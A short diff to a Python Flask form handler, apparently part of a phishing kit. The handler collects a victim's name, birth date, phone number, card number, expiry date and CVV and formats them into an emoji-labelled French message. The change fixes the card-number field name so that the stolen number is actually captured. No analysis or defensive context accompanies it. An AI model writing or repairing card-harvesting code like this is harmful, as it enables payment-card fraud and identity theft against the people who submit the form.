@@ -16,7 +16,7 @@ def submit():
     prenom = request.form.get('prenom')
     date_naissance = request.form.get('date_naissance')
     telephone = request.form.get('telephone')
-    numero_carte = request.form.get('numero de carte')
+    numero_carte = request.form.get('numero_carte')
     date_expiration = request.form.get('date_expiration')
     cryptogramme = request.form.get('cryptogramme')
 
@@ -25,7 +25,7 @@ def submit():
 🧾 Prénoms : {prenom}
 🎂 Date de naissance : {date_naissance}
 📞 Téléphone : {telephone}
-📁 Numéro de carte : {numero_carte}
+💳 Numéro de carte : {numero_carte}
 📅 Date d'expiration : {date_expiration}
 💳 Cryptogramme : {cryptogramme}
 """
